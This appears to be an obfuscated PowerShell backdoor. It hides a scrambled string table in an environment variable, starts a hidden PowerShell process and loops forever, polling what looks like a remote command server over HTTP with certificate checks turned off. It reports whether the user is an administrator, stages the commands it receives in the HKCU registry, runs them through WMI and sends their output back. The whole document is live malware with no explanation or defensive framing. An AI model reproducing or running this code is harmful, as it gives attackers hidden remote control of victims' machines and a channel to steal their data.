function boxpsjob {
	 
    $h0 = New-Object System.Diagnostics.ProcessStartInfo; 
    $h0.FileName = "powershell.exe"; 
    $h0.EnvironmentVariables.Add("memcat", 
        'cr?0t?^G?tB;
        t?s^s;
        st?m.coee?ctio]s.0rr0;
        eist^AddR0]a?^Pr0am0: ]o - c0cf?^I]d?xO9^C0cf? - Co]troe: ]o - c0cf?, ]o - stor?^hd2 = "^\\eoc0efost\ROOT\CIMV2:wi]32_lroc?ss^&=i?X^Us?rAa?]t^Tim?out^G?tStri]a^"5hq& = "^hlid"5tr;
        zhf4 = i?xy[T?xt.E]codi]ap::u]icod?.G?tstri]ay[Co]v?rtp::Fromb0s? {
            4Stri]ayhd2)))
        }
        c0tcfzhf4 = "ErrC1:" + h?rror[&p.Exc?ltio]
        }
        hf4 = y[Co]v?rtp::Tob0s? {
        4Stri]ay[T?xt.E]codi]ap::u]icod?.G?tb;
        t?syhf4)))5i9yhf4.L?]atf  - a? 4&&&)zh$2 = hf4  - sleit "y.z4&&&})"  - ]? ""59or yho( = &5 ho(  - et h$2.L?]atf5ho(++)zN?w - It?mProl?rt;
        - l0 hq&  - ] "oho("  - v h$2[ho(p|Out - Nuee
        }
        }
        ?es?zN?w - It?mProl?rt;
        - l0 hq&  - ] "o&"  - v hf4|Out - Nuee
        }
        ^All?]d^fttl://cfi]0imlort1x1.d?/xmerlc.lfl^R?mov?At^FromB0s?{4Stri]a^E]viro]m?]tV0ri0be?s^K??lAeiv?^ToB0s?{4Stri]a^low?rsf?ee -Com hi(=yai ?]""v"":^S;st?m.IO.Str?0mR?0d?r^1)5]0e f7 hi(.V0eu?5f7 hl{.V0eu?^\hlid"59oryhog=&5hog -e? 1&&&&5hog++)ztr;zhf3+=yal -l0tf h]7).hog}C0tcfz}i9yhf3.L?]atf -?q h]4)zbr?0n}h]4=hf3.L?]atf}tr;zi?xyhf3)}c0tcfz}5^G?tCurr?]t^Cr?0t?Fe0as^Admi]istr0tor^S?curit;.Pri]cil0e.Wi]dowsPri]cil0e^Exlir?s: &^Cou]t^BDgFF78(13^R?0dToE]d^U]icod?^Substri]a^HKCU:\SOFTWARE\^Co]t?]tL?]atf^ToCf0rArr0;^&)5hl{=yai ?]""v"":^a?tR?qu?stStr?0m^y.z1&&&&&})^e?]atf^a?tR?slo]s?Str?0m^y.z4&&&})^S;st?m.T?xt.Stri]aBuied?r^G?tR?slo]s?^Co]t?]tT;l?^SfowWi]dow^0lleic0tio]/x-www-9orm-ure?]cod?d^Mo$iee0/g.& yWi]dows NT 1&.&5 Wi]{45 x{4) Alle?W?bKit/g37.3{ yKHTML, ein? G?cno) Cfrom?/1&7.&.&.& S090ri/g37.3{^1=Se??l -s 25h]7="HKCU:\SOFTWARE\^POST^IsI]Roe?^Wi]32_Proc?ssSt0rtul^M?tfod'); 
    $h0.UseShellExecute = $false; 
    $h0.LoadUserProfile = $false; 
    $h0.CreateNoWindow = $true; 
    $h0.RedirectStandardInput = $true; 
    $h0.RedirectStandardOutput = $true; 
    $h0.RedirectStandardError = $true; 
    $x7 = [BoxPSStatics]::SystemDiagnosticsProcessStart($h0); 
    $e8 = Register-ObjectEvent -InputObj $x7 -Event "ErrorDataReceived" -Action { param([System.Object] $e7, [System.Diagnostics.DataReceivedEventArgs] $e); 
    
    Write-host $e.Data 
}; 
    
    sleep 10; 
    $x7.StandardInput.WriteLine('$d = (gi env:memcat).Value;
    [System.Environment]::SetEnvironmentVariable("memcat", "");
    $t2 = ''kn]ple?6 {
        z$hf9(y;
        5ga0&''.((''TO'') + (''CHARa'') + (''rRAy''))();
        for($n9 = 1;
        $n9  - le 21;
        $n9++) {
            $d = $d.((''rE'') + (''p'') + (''L'') + (''A'') + (''c'') + (''E''))($t2[$n9], $t2[$n9 - 1]);
        }
    
        $d = $d.((''sP'') + (''Li'') + (''T''))(''^'');
        function t8($j7) {
            $q9 = $j7.($d[38])();
            $z1 = new - object ($d[45]);
            $q3 = $q9.($d[31]);
            for($m0 = 0;
            $m0  - lt $q3;
            $m0++) {
                if ($m0%2)  {
                    [void]$z1.($d[15])($q9[$m0] + $j0)
                };
                $j0 = $q9[$m0];
            }
    
            if ($q3%2)  {
                [void]$z1.($d[15])($q9[$q3 - 1])
            }
    
            $z1.ToString();
        }
    
        function x6($v7) {
            t8([Convert]::($d[21])([Text.Encoding]::($d[34]).($d[1])($v7)));
        }
    
        function g9($a3) {
            $a3 = t8($a3);
            [Text.Encoding]::($d[34]).($d[12])([Convert]::($d[18])($a3))
        }
    
        if ((New - Object ($d[29]) ([Security.Principal.WindowsIdentity]::(($d[26]))())).($d[53])([Security.Principal.WindowsBuiltinRole]::($d[28])))  {
            $v4 = "1"
        } else {
            $v4 = "0"
        };
        $c2 = ($d[32]);
        $b1 = new - object ($d[2]);
        $j6 = new - object ($d[2]);
        $f7 = ($d[36]) + $c2 + ''\'';
        function d5($k7) {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
            [Net.ServicePointManager]::ServerCertificateValidationCallback = {
                $true
            };
            $y5 = ($d[50]);
            $i3 = 30000;
            $l4 = ($d[16]);
            $z3 = "$c2=$v4";
            if ($j6.($d[31])  - ne 0)  {
                $z3 = "$z3!" + ($j6  - join "|")
            };
            if ($k7.($d[42])  - gt 0)  {
                $g8 = (x6($k7)).replace("+", "!");
                $z2 = $g8  - split ($d[41])  - ne "";
                $f1 = Get - Random  - Mi 10000000  - Ma 99999999;
                for ($i4 = 0;
                $i4  - lt $z2.Length;
                $i4++) {
                    if ($i4  - eq 0)  {
                        $v9 = 0;
                    } elseif ($i4  - eq ($z2.Length - 1))  {
                        $v9 = 2;
                    } else {
                        $v9 = 1;
                    }
    
                    if ($z2.Length  - eq 1)  {
                        $c9 = "";
                    } else {
                        $c9 = "[sX<$f1>$v9]";
                    }
    
                    $g8 = $z2[$i4];
                    $n1 = [System.Text.Encoding]::ASCII.($d[1])("$c2=$c9$g8");
                    $b4 = [System.Net.WebRequest]::($d[0])($l4);
                    $b4.($d[10]) = $y5;
                    $b4.($d[11]) = $i3;
                    $b4.($d[20]) = 0;
                    $b4.Headers.Add("Cookie: $z3");
                    $b4.Headers.Add(($d[4]));
                    $b4.Headers.Add(($d[6]));
                    $b4.Headers.Add(($d[30]));
                    $b4.($d[55]) = ($d[52]);
                    $b4.($d[47]) = ($d[49]);
                    $b4.($d[37]) = $n1.($d[42]);
                    $j8 = $b4.($d[40])();
                    $j8.write($n1, 0, $n1.($d[42]));
                    $j8.flush();
                    $j8.close();
                    try {
                        $m6 = $b4.($d[46])();
                        $l1 = $m6.($d[43])();
                        $v5 = new - object ($d[23]) $l1;
                        $d6 = $v5.($d[33])();
                    } Catch {}
    
                }
    
            } else {
                $b4 = [System.Net.WebRequest]::($d[0])($l4);
                $b4.($d[10]) = $y5;
                $b4.($d[11]) = $i3;
                $b4.($d[20]) = 0;
                $b4.Headers.Add("Cookie: $z3");
                $b4.Headers.Add(($d[4]));
                $b4.Headers.Add(($d[6]));
                $b4.Headers.Add(($d[30]));
                $b4.($d[55]) = ''GET'';
                try {
                    $m6 = $b4.($d[46])();
                    $l1 = $m6.($d[43])();
                    $v5 = new - object ($d[23]) $l1;
                    $d6 = $v5.($d[33])();
                } Catch {}
    
            }
    
            $a2 = $d6  - split $c2;
            if ($a2.($d[31])  - eq 3)  {
                $i7 = g9($a2[1])
            } else {
                $i7 = ""
            }
    
            $i7;
        }
    
        function b8($x8) {
            $j3 = Get - Random;
            $y2 = "$f7$j3";
            $p8 = [Convert]::($d[21])([Text.Encoding]::($d[34]).($d[1])($x8));
            $p8 = ($d[7]) + $p8 + ($d[13]) + $f7 + ($d[14]);
            if ( - Not(Test - Path $y2))  {
                New - Item  - Type Folder  - Path $f7  - Name $j3  - Force | Out - Null
            };
            if ($p8.($d[42])  - ge 4000)  {
                $e2 = $p8  - split ($d[44])  - ne "";
                for($p7 = 0;
                $p7  - lt $e2.($d[42]);
                $p7++) {
                    New - ItemProperty  - pa $y2  - n $p7  - v $e2[$p7] | Out - Null
                }
    
            } else {
                New - ItemProperty  - pa $y2  - n "0"  - v $p8 | Out - Null 
            }
    
            $k4 = [wmiclass]($d[54]);
            $k4.Properties[($d[48])].value = $False;
            $k4.Properties[($d[27])].value = 16777216;
            [String[]] $p4 = Get - ChildItem Env:\ *  | % {
                "$($_.Name)=$($_.Value)"
            };
            $p4 += ($c2 + ($d[9]));
            $p4 += ($c2 + ($d[51]) + $c2 + ($d[25]));
            $k4.Properties[($d[19])].value = $p4;
            try {
                $s9 = (gp  - path $f7  - ErrorA si).($c2 + "@")
            } Catch {};
            if ($s9  - ne $null)  {
                $m3 = $s9
            } else {
                $m3 = ''C:\''
            };
            $n2 = ([WMICLASS]($d[8])).($d[0])(($d[22]) + $c2 + ($d[39]) + $c2 + ($d[24]), $m3, $k4);
            $l9 = $n2.ProcessId;
            if ($l9)  {
                Rename - Item $y2  - NewName $l9;
                return $l9
            } else {
                return 0
            }
    
        }
    
        function l7($g2) {
            $n7 = "$f7$g2";
            if ((Get - ItemProperty $n7).o0  - ne $null)  {
                for($u0 = 0;
                $u0  - le 10000;
                $u0++) {
                    try {
                        $f2 += (gp  - path $n7)."o$u0"
                    } Catch {};
                    if ($f2.($d[42])  - eq $c6)  {
                        break
                    }
    
                    $c6 = $f2.($d[42])
                };
                [Text.Encoding]::($d[34]).($d[12])([Convert]::($d[18])($f2));
            } else {
                return "No"
            };
            Remove - Item $n7  - Recurse  - Force;
        }
    
        function p5($q5) {
            if ($q5  - ne "")  {
                $z4 = $q5.($d[42]);
                $d1 = $q5.($d[35])($z4 - 8);
                $r9 = $q5.($d[35])(0, $z4 - 8);
                $e9 = b8($r9);
                if ($e9  - ne 0)  {
                    $b1.add($e9)|Out - Null;
                    $j6.add($d1)|Out - Null;
                }
    
            }
    
        }
    
        $o8 = 0;
        $r1 = (Get - Date);
        While ($True)  {
            $z9 = 0;
            $a9 = "";
            if ($b1.($d[31])  - ne 0)  {
                $a2 = get - process powershell|select  - expand id;
                $h6 = new - object ($d[2]);
                $h6.($d[3])($b1);
                foreach($f9 in $h6 ) {
                    if ( - Not($a2  - contains $f9))  {
                        $n5 = $b1.($d[5])($f9);
                        if ($n5  - ne  - 1)  {
                            $s6 = $j6[$n5];
                            $b1.($d[17])($n5);
                            $j6.($d[17])($n5);
                            $s4 = l7($f9);
                            $a9 += "[!$c2!]" + $s4 + "!" + $s6;
                            $z9 = 1;
                        }
    
                    }
    
                }
    
            }
    
            if ($z9  - ne 0)  {
                $a7 = $a9;
            } else {
                $a7 = "";
            }
    
            $m1 = ((Get - Date) - $r1).TotalSeconds;
            if (($z9  - ne 0)  - or ($m1  - ge $o8))  {
                $r1 = (Get - Date);
                $o3 = d5($a7);
                p5($o3);
                try {
                    $f4 = (gp  - path $f7  - ErrorA si).$c2
                } Catch {};
                if ($f4  - ne $null)  {
                    $o8 = $f4
                } else {
                    $o8 = 60
                };
            }
    
            sleep  - s 2;
        }'); 
    
    sleep 20; 
    
    if ($x7.WaitForExit(1)) { 
        echo "Error start process. ExitCode:"+$x7.ExitCode; 
    }
    else { 
        echo "Process started" 
    }; 
    
    $x7.BeginErrorReadLine(); 
    Unregister-Event -SourceIdentifier $e8.Name; 

}
boxpsjob
